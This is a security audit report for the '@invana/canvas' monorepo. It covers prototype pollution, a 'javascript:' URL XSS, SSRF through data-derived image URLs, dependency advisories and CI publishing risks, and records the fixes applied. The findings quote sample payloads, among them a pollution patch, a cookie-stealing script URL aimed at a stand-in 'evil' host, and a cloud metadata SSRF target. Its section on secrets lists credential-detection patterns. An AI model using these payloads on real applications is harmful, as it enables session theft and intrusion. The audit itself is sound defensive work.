# Security Audit — `@invana/canvas` monorepo

**Date:** 2026-07-19
**Scope:** Full repository — dependency vulnerabilities, secret/credential exposure, supply-chain & CI/CD, and source-level review (XSS/injection, prototype pollution, SSRF, DoS) across all 18 packages and 2 apps.
**Method:** `pnpm audit` + three parallel read-only source audits (React/UI surfaces, engine/template data pipeline, supply-chain/CI). Two headline findings independently re-verified against source.
**Bottom line:** No committed secrets, no malicious install scripts, no evidence of compromise. Two source-level issues warrant a fix (one prototype-pollution in the store kernel, one `javascript:`-URL XSS in the property renderer). The rest is dependency patching and publish-pipeline hardening.

---

## Severity summary

| # | Severity | Finding | Location |
|---|----------|---------|----------|
| A1 | **High** — ✅ **FIXED 2026-07-19** | Prototype pollution in store patch kernel (`applyDeepPartial`) | `canvas-store/src/port/patch.ts:22` |
| A2 | **Medium** — ✅ **FIXED 2026-07-19** | `javascript:` URL XSS via `hints`-forced `url` renderer (bypasses `isSafeHref`) | `canvas-react/src/components/propertyRenderers.tsx:336,126` |
| A3 | **Medium** — ✅ **FIXED 2026-07-19** | Arbitrary image/icon/SVG URLs from node data are fetched (exfil / SSRF) | `graph`, `canvas` texture + hover paths |
| D1 | **Critical** (dev-only) — ✅ **FIXED** | `vitest` <3.2.6 UI-server arbitrary file read/exec | dev dependency |
| D2 | **High** (dev-only) — ⚠️ **PARTIAL** | `vite` / `rollup` / `esbuild` / `ws` / `@xmldom/xmldom` etc. — 21 high advisories | tooling deps |
| D3 | **Moderate** (shipped) — ✅ **FIXED** | `@opentelemetry/core` DoS — affects a **published** package | `canvas-telemetry-otel` |
| S1 | **Medium** | GitHub Actions pinned by tag, not SHA, around `NPM_TOKEN` | `.github/workflows/*.yml` |
| S2 | **Medium** | Long-lived `NPM_TOKEN` instead of OIDC trusted publishing | `publish.yml:45` |
| S3 | **Medium** | pnpm 9 runs dependency install scripts unrestricted | `package.json` / workspace |
| A4/A5 | Low — ✅ **FIXED** | Unvalidated image `src` in cards; missing `rel="noopener"` branch; `deepMerge` `__proto__` (unbounded template element count still open) | various |
| S4–S6 | Low/Info | `.gitignore` env coverage; `workflow_dispatch` publish; `private`+`publishConfig` contradiction | config |

No critical or high **source** findings; no secrets; no supply-chain compromise.

### Remediation status (updated 2026-07-19)

All source findings (A1–A5) and the shipped-code dependency finding (D3) are fixed and verified; the dependency criticals/highs are cleared except for lint/build/docs-only tooling that cannot be forced without breaking a major.

**Applied fixes**
- **A1** — `__proto__`/`constructor`/`prototype` guard added to `applyDeepPartial` (+ the copy-based `deepMerge`/`mergeDeep` siblings). Runtime-verified: a `{"k":{"__proto__":{…}}}` patch no longer touches `Object.prototype`.
- **A2** — `LinkValue` now re-checks `isSafeHref` and falls back to plain text; `rel="noopener noreferrer"` applied unconditionally (A5). `ImageValue` re-checks `isImageUrl`.
- **A3/A5** — `HoverElementPreviewCard` (canvas-react) and `NodePreviewCard` (canvas-ui) now gate `<img src>` behind an `https:`/`data:image` scheme check.
- **D1** — `vitest` `^2.1.8` → `^3.2.6` across 9 packages. Suites re-run green (canvas-store 116, graph 96).
- **D3** — `canvas-telemetry-otel` `@opentelemetry/*` bumped (`resources`/`sdk-*` → `^2.9.0`, experimental exporters → `^0.220.0`), pulling patched `@opentelemetry/core` 2.9.0 into the **published** package. Required a one-line API fix (`SimpleLogRecordProcessor` now takes `{ exporter }`). Package builds clean.
- **D2 (partial)** — `pnpm-workspace.yaml` `overrides` force patched `ws`, `@xmldom/xmldom`, `flatted`, `linkify-it`, `markdown-it`, `rollup`; `turbo` → `^2.10.5`; storybook `vite` → `^7.3.5` + its OTel deps bumped. Cleared the vitest critical and 12 of 21 highs.

**Audit delta:** critical **1 → 0**, high **21 → 9**, moderate **17 → 11**, low **2 → 1**.

**Residual (all dev/build/lint/docs tooling — ships in no published package; accepted):**
- `minimatch` (6 high) / `picomatch` (2 high) — ReDoS reachable only via glob patterns, which here come from ESLint config + build tooling (developer-authored, not attacker input). Multiple majors coexist in the tree; a single override can't patch all without a breaking major (`picomatch@4` would break `micromatch@4`, which pins picomatch 2). pnpm's major-scoped override keys were not honoured by the installed pnpm. Clears only via an ESLint-toolchain major bump.
- `vite` (1 high, 2 mod) + `esbuild` (1 mod) — from `apps/docs` (vitepress 1.6 is pinned to vite 5); dev-server / docs-build only. Clears via vitepress 2 (separate major upgrade).
- `js-yaml` / `ajv` / `brace-expansion` (moderate) — ESLint, lint-time. `@babel/core` (low) — storybook build.

**Note:** the installed pnpm is newer than the pinned `packageManager: pnpm@9.0.0` and no longer reads the `pnpm.overrides` field from `package.json` — overrides now live in `pnpm-workspace.yaml`. The stale `pnpm` field was removed from the root `package.json`. (Relates to S3 — a pnpm-version alignment / install-script-allowlist pass is still open.)

---

## A. Source-level findings

### A1 — HIGH · Prototype pollution in the store patch kernel — ✅ FIXED 2026-07-19

**Fix applied:** `applyDeepPartial` now skips `__proto__`/`constructor`/`prototype` keys (shared `FORBIDDEN_MERGE_KEYS` set); the same guard was mirrored into the copy-based siblings `deepMerge` (`canvas/src/engine/CanvasConfig.ts`) and `mergeDeep` (`graph-layout-d3-force/src/D3ForceLayout.ts`) — see A4. Verified: a `{"k":{"__proto__":{…}}}` patch through the real `computeChange`→immer path no longer sets `Object.prototype`, and the malicious key is dropped while legitimate state is preserved. All three packages type-check clean.

**File:** `packages/canvas-store/src/port/patch.ts:22-28` (guard at `:11-15`)

`applyDeepPartial` deep-merges an untrusted object patch **into a mutable immer draft in place**, with no key filtering:

```ts
export function applyDeepPartial(draft, patch) {
  for (const [k, v] of Object.entries(patch)) {
    const cur = draft[k];
    if (isPlainObject(v) && isPlainObject(cur)) applyDeepPartial(cur, v); // recurse in place
    else draft[k] = v;
  }
}
```

`isPlainObject` accepts objects whose prototype is `Object.prototype` or `null` but does **not** reject `__proto__` / `constructor` / `prototype` keys. This is the store's public write path: `view.update(patch, action)` → `computeChange` → `applyDeepPartial` (`port/store-core.ts`), and `update()` performs **no key validation**.

**Exploit:** an object-form patch derived from untrusted JSON such as
`{"anyKey": {"__proto__": {"polluted": true}}}`
recurses until it reaches `draft['__proto__']`, which resolves to the real prototype, then executes `Object.prototype.polluted = true` — **global prototype pollution**. immer does not protect because reading `__proto__` returns the undrafted prototype.

**Reachability:** any object-form (non-recipe) patch to `view.update` — editor `setOptions` apply paths, a future Yjs/collab patch stream, or any consumer forwarding untrusted config into a patch. The current `importState` path happens to route through the copy-based `deepMerge` (A4) instead, so it's mitigated *by luck, not design*.

**Fix:** skip the three dangerous keys at the merge loop and in `isPlainObject`:
```ts
if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;
```
Apply the same guard to `deepMerge`/`mergeDeep` for consistency. Consider `Object.create(null)` / `Map` for genuinely user-keyed records.

---

### A2 — MEDIUM · `javascript:` URL XSS via `hints`-forced `url` renderer

**Files:** `packages/canvas-react/src/components/propertyRenderers.tsx:336-339` (bypass) + `:126-138` (sink); consumed by `PropertyDetailView.tsx:70` and the `NodeDetailView`/`EdgeDetailView` toolbars.

The `url` renderer is normally selected only via `match: (v) => isSafeHref(v)` — a scheme allow-list (http/https/file/mailto) that rejects `javascript:`. But the `hints` override force-selects a renderer **without running `match`**:

```ts
if (ctx.hint) {
  const forced = all.find((r) => r.kind === ctx.hint);
  if (forced) return forced;   // isSafeHref never runs
}
```

`LinkValue` then renders `<a href={href}>` with the raw value (verified — the component only branches on `^https?:` for `target`/`rel`, it does not re-validate the scheme). React does not block `javascript:` hrefs at runtime.

**Exploit:** with a consumer-set `hints[key] = 'url'`, a node property value `javascript:fetch('//evil/?c='+document.cookie)` renders as a clickable link; clicking runs script in the app origin. Graph node/edge data is typically end-user-generated in the consuming app.

**Fix:** re-check `isSafeHref(href)` **inside** `LinkValue` and fall back to plain text if it fails — a renderer that writes into `href` must sanitize its own input regardless of how it was selected.

---

### A3 — MEDIUM · Arbitrary resource URLs from node data are fetched (exfil / SSRF)

**Files:**
- `packages/graph/src/behaviours/HoverElementPreviewBehaviour.ts:389,414` — `imageUrl` pulled from a node-data field → `<img src>` in the React hover overlay.
- `packages/canvas/src/textures/TextureRegistry.ts:54-64` — `Assets.load(url)` on any URL, with a parser hint that *forces* loading extension-less/API URLs.
- `packages/canvas/src/primitives/paint/insetContentLayer.ts:250-264` — `fetchSvgPathD` does `fetch(url)` on an arbitrary `svg-url`.
- `packages/graph/src/layer/types.ts:403-432` — `image.url` / `icon:{kind:'svg-url',url}` per-node style.

No scheme/host validation on data-derived URLs. A node with `data.avatar = "https://attacker/track.gif?t=..."` beacons on hover/render; in an Electron/desktop packaging an internal address (`http://169.254.169.254/...`, `http://localhost:port/...`) enables SSRF-style probing. `<img src>` does not execute `javascript:`, so this is exfil/SSRF, not direct script execution. The SVG is parsed detached from the DOM (`DOMParser`, geometry attrs only) so embedded scripts don't run — the *fetch itself* is the concern.

**Fix:** validate scheme (`https:`/`data:` only) on data-derived URLs, optionally allow-list hosts, add `referrerpolicy="no-referrer"`, and block private-IP ranges in Electron contexts. Treat data-derived URLs differently from developer-config URLs (maplibre `styleUrl` etc. are developer-controlled — fine).

---

### A4 — LOW · `deepMerge`/`mergeDeep` share the missing `__proto__` blocklist (copy-based → local only)

**Files:** `packages/canvas/src/engine/CanvasConfig.ts:44-63`; `packages/graph-layout-d3-force/src/D3ForceLayout.ts:741-750`.
Both build a fresh `out = {...base}` and reassign, so `out['__proto__']` lands on a throwaway copy — **no global pollution**, only a corrupted local merge result. Used in the `importState` untrusted path. Add the same key filter as A1 for defense-in-depth.

### A5 — LOW · Card/renderer hygiene
- Unvalidated image `src` in `canvas-ui/src/views/preview-cards.tsx:67` and `canvas-react/src/components/HoverElementPreviewCard.tsx:46` — route through the existing `isImageUrl` allow-list (same vector as A3).
- `LinkValue` omits `rel="noopener noreferrer"` on non-`https` links (`propertyRenderers.tsx:126`) — minor; fixing A2 covers the real risk.
- `iconifyUrl` (`graph/src/cards/shared.ts:20`) interpolates `data.icon` into a fixed-host path — confined to the path segment (cannot change origin); `encodeURIComponent` for hygiene.
- Unbounded `struct.elements` in `compileFreeform` (`graph/src/template/compile.ts:362`) — a huge template array blows up part count linearly (no cycles → no stack overflow). Cap element/part counts when compiling untrusted templates.

---

## B. Dependency vulnerabilities (`pnpm audit`)

`1015` deps · **1 critical, 21 high, 17 moderate, 2 low**. **Almost all are dev/tooling** (Storybook, VitePress, TypeDoc, ESLint, vitest, vite) — not shipped in any published package. Published-package exposure is limited to D3.

### D1 — CRITICAL (dev-only) · `vitest` 2.1.9 → ≥3.2.6
When the Vitest UI server is listening, an arbitrary file can be read and executed. Dev-time only (test runner), but bump `vitest` across `canvas`, `canvas-store`, `graph`. Note per repo rules `packages/canvas` has no tests — the dep may be removable there.

### D2 — HIGH (dev/tooling) · 21 advisories
`vite` (fs.deny bypass, WS arbitrary file read), `rollup` (path-traversal file write), `esbuild` (dev-server request forgery), `ws` (memory-exhaustion DoS), `@xmldom/xmldom` (XML injection/DoS, pulled via `pixi.js`→`pixi-viewport`), `minimatch`/`picomatch`/`brace-expansion`/`flatted` (ReDoS + prototype pollution, via ESLint), `linkify-it`/`markdown-it` (quadratic DoS, via TypeDoc). All are build/docs/lint toolchain. Resolve by upgrading Storybook/VitePress/ESLint/vite to patched lines; most are transitive and clear on a lockfile refresh.

### D3 — MODERATE · `@opentelemetry/core` ≥2.8.0 — **affects a published package**
Unbounded memory allocation in W3C Baggage propagation. Reached through `@invana/canvas-telemetry-otel` (v0.0.11), which ships the OTel SDKs as real runtime `dependencies` — so unlike D1/D2 this is in **published** code. Bump the `@opentelemetry/*` deps in `packages/canvas-telemetry-otel`.

Other moderates (`js-yaml`, `ajv`, `turbo` login CSRF) are all dev/tooling.

**Recommended sequence:** (1) bump `@opentelemetry/*` in `canvas-telemetry-otel` (only published-code exposure); (2) bump `vitest` (clears D1); (3) refresh Storybook/VitePress/vite/ESLint to clear the D2 cluster; (4) `pnpm dedupe` + re-audit.

---

## C. Supply-chain, CI/CD & secrets

**No committed secrets.** Sweeps for `AKIA…`, `ghp_/ghs_/github_pat_`, `sk-…`, `xox[baprs]-`, `PRIVATE KEY` blocks, and hardcoded `apiKey/token/password/secret` across the repo (incl. dotfiles) — **zero hits**. No `.pem`/`.key`/`.env` on disk or tracked. **No lifecycle scripts** (`preinstall`/`postinstall`/`prepare`/`prepublishOnly`) in any of the 22 manifests. `.npmrc` is empty; lockfile v9 present; CI uses `--frozen-lockfile`. No `pull_request_target`, no `${{ github.event.* }}` interpolation into `run:` blocks, no git/tarball dependency specifiers, no typosquat-suspicious names.

### S1 — MEDIUM · Third-party Actions pinned by mutable tag around the npm token
`.github/workflows/publish.yml` (lines 22,27,30,54) and `deploy-storybook.yml` use `pnpm/action-setup@v5`, `softprops/action-gh-release@v2`, `actions/checkout@v6`, etc. — all mutable tags. `pnpm/action-setup` installs the binary that runs `pnpm -r publish` with `NODE_AUTH_TOKEN=secrets.NPM_TOKEN`; a retargeted tag (the tj-actions pattern) exfiltrates the publish token for all 16 `@invana/*` packages. **Fix:** pin every action to a full commit SHA + enable Dependabot for `github-actions`.

### S2 — MEDIUM · Long-lived `NPM_TOKEN` instead of OIDC trusted publishing
`publish.yml:45`. The workflow already has `id-token: write` and `--provenance` — 90% of the way to OIDC. **Fix:** configure npm Trusted Publishing and delete the standing token; until then scope it to `@invana`, mark automation, rotate.

### S3 — MEDIUM · pnpm 9 runs dependency install scripts unrestricted
`package.json` `packageManager: pnpm@9.0.0`, no `onlyBuiltDependencies` allow-list. Every `pnpm install` (including in `publish.yml`, *before* the publish step that holds the token) runs arbitrary transitive postinstall scripts — the Shai-Hulud worm vector. **Fix:** upgrade to pnpm 10 (blocks dep scripts by default) or add `pnpm.onlyBuiltDependencies` allow-listing only deps that need builds (e.g. esbuild); append the corepack integrity hash to `packageManager`.

### S4–S6 — Low / Info
- **S4 (Low):** `.gitignore` covers only `.env*.local` variants while `turbo.json` declares `.env*` as build inputs — a future `.env.production` is committable. Replace with `.env*` (+ `!.env.example`).
- **S5 (Low):** `workflow_dispatch` on `publish.yml` lets any write-access collaborator publish unreviewed branch code and mints a stray release tag from the branch name. Guard the publish step with `if: startsWith(github.ref,'refs/tags/v')` or a reviewed environment.
- **S6 (Info):** `packages/typescript-config` is `private:true` yet declares `publishConfig.access:public` and has no `files` field — contradictory; remove the `publishConfig` block.

---

## D. Coverage — checked and clean

- **No** `dangerouslySetInnerHTML` / `outerHTML` / `insertAdjacentHTML` / `document.write` in any package source. The only `innerHTML` sinks (`LayersPanelLayer.ts:271,313`, `DevInfoLayer.ts:361`) are dev/debug overlays routed through `escapeHtml`/`escapeAttr` over developer-controlled ids — not node data.
- **No** `eval` / `new Function` / string `setTimeout` / data-derived dynamic `import()` anywhere.
- **No** `postMessage` listeners (no origin-check gap), **no** `localStorage`/`sessionStorage` read-then-render, **no** `window.open`/`location` sinks. Download anchors use `URL.createObjectURL` of local Blobs only.
- Node labels/text render via **pixi text** (not DOM); hover-card text flows through auto-escaping React.
- Path resolvers (`resolvePath`, `getByPath`) are read-only and stringify — no write, no pollution.
- **No ReDoS**: all regexes on untrusted strings are linear (no nested quantifiers).
- Layout packages delegate to bounded d3/elk; no custom unbounded recursion over untrusted structures.
- maplibre `styleUrl` is developer-config, default fixed OpenFreeMap URL.
- `release.sh` safe (`set -euo pipefail`, no `curl|sh`, no interpolated child_process). turbo.json has no remote cache / env passthrough. No dev server binds `0.0.0.0`; no `allowedHosts`/proxy. `.claude/` PreToolUse hook is a static guarded `echo`.

---

## Prioritized remediation

1. **A1** — add the `__proto__`/`constructor`/`prototype` guard to `applyDeepPartial` (and `deepMerge`). Cheap, closes the one HIGH.
2. **A2** — re-check `isSafeHref` inside `LinkValue`.
3. **D3** — bump `@opentelemetry/*` in `canvas-telemetry-otel` (only published-code CVE).
4. **A3/A5** — scheme-validate data-derived image/icon/SVG URLs via the existing allow-list.
5. **S1–S3** — SHA-pin Actions, move to OIDC trusted publishing, restrict pnpm install scripts.
6. **D1/D2** — bump vitest, then refresh the Storybook/VitePress/vite/ESLint toolchain and re-audit.
7. **A4, S4–S6** — hygiene cleanups.

*Findings A1 and A2 were re-verified against source; the rest come from `pnpm audit` and read-only source review. Dependency advisory versions reflect the registry state on 2026-07-19.*
